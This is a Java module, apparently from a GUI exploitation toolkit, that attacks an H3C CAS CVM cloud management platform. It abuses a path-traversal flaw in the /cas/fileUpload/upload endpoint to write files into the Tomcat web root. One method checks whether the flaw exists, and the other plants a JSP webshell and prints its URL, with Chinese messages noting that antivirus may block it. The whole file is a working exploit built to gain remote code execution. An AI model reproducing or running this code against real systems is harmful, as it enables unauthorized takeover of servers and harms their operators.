package exp.equipment.h3c;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

import java.util.HashMap;

public class cas_cvm_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return shell(url, textArea);
    }

    private boolean att(String url,TextArea textArea){
        String payload = shell.readFile(shell.Testpath);

        HashMap<String,String> head = new HashMap<>();
        head.put("Content-range","bytes 0-10/20");
        head.put("Accept-Encoding","gzip, deflate");
        head.put("Content-type","");

        Response post = HttpTools.post(url + "/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/nishizhu.txt&name=222", payload, head, "utf-8");

        Response response = HttpTools.get(url + "/cas/js/lib/buttons/nishizhu.txt", new HashMap<String, String>(), "utf-8");
        if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
            Platform.runLater(() -> {
                textArea.appendText(
                        "\n 漏洞存在 测试文件写入成功 \n " + url + "/cas/js/lib/buttons/nishizhu.txt"
                );
            });
            return true;
        }else {
            Platform.runLater(() -> {
                textArea.appendText("\n cas_cvm云计算管理平台-RCE-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }
    }

    private boolean shell(String url,TextArea textArea){
        String payload = shell.readFile(shell.Jsppath);

        HashMap<String,String> head = new HashMap<>();
        head.put("Content-range","bytes 0-10/20");
        head.put("Accept-Encoding","gzip, deflate");
        head.put("Content-type","");

        Response post = HttpTools.post(url + "/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/nishizhu.jsp&name=222", payload, head, "utf-8");

        Response response = HttpTools.get(url + "/cas/js/lib/buttons/nishizhu.txt", new HashMap<String, String>(), "utf-8");
        if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
            Platform.runLater(() -> {
                textArea.appendText(
                        "\n 漏洞存在 webshell文件写入成功 \n " + url + "/cas/js/lib/buttons/nishizhu.jsp"
                );
            });
            return true;
        }else {
            Platform.runLater(() -> {
                textArea.appendText("\n 疑似杀软查杀 请手动复现");
            });
            return false;
        }
    }


}
